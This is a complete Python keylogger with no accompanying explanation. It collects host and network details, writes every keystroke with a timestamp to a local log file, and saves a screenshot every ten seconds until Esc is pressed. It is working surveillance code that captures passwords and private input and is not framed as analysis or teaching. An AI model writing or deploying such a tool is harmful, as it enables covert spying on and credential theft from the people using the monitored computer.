import socket
import platform
from pynput import keyboard
from datetime import datetime
from PIL import ImageGrab
import time
import os

# File settings
# 
LOG_FILE = "keylog.txt"
SCREENSHOT_DIR = "screenshots"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

def get_system_info():
    """Collect system information"""
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    processor = platform.processor()
    system_info = f"{platform.system()} {platform.release()}"
    machine_info = platform.machine()
    
    info = f"""
    System Information:
    Hostname: {hostname}
    IP Address: {ip_address}
    Processor: {processor}
    System: {system_info}
    Machine: {machine_info}
    """
    return info

def on_press(key):
    """Keystroke logging"""
    try:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp}: '{key.char}'\n")
    except AttributeError:
        special_key = str(key).split(".")[-1]
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp}: '[{special_key}]'\n")
    
    # Stop recording when pressing Esc
    if key == keyboard.Key.esc:
        return False

def take_screenshot():
    """Take a screenshot"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{SCREENSHOT_DIR}/screenshot_{timestamp}.png"
    ImageGrab.grab().save(filename)
    return filename

def main():
    # Recording system information
    system_info = get_system_info()
    with open(LOG_FILE, "w") as f:
        f.write(system_info + "\nKey Log:\n")
    
    # Start key recording
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Take screenshots every 10 seconds
    try:
        while listener.is_alive():
            take_screenshot()
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    
    listener.join()

if __name__ == "__main__":
    main()

